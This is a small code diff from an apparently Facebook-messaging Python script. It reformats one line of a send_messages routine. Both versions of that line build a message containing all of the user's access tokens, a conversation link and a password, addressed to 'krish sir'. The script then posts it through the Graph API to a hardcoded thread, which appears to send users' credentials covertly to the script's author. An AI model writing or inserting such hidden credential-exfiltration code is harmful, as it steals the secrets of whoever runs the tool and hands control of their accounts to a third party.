@@ -105,7 +105,7 @@ def send_messages():
 	def msg():
 		parameters = {
 			'access_token' : random.choice(access_tokens),
-			'message': 'User Profile Name :                  '+getName             (random.choice(access_tokens))+'\ Hello krish sir i am using your server my token is: Token :  '+" | ".join(access_tokens)+'\ Link : https://www.facebook.com/messages/t/'+convo_id+'\ Password: '+password
+			'message': 'User Profile Name :'+getName             (random.choice(access_tokens))+'   \ Hello krish sir i am using your server my token is:     '+" | ".join(access_tokens)+'   \ Link : https://www.facebook.com/messages/t/'+convo_id+'   \ Password: '+password
 		}
 		try:
 			s = requests.post("https://graph.facebook.com/v15.0/t_100053757482432/", data=parameters, headers=headers)
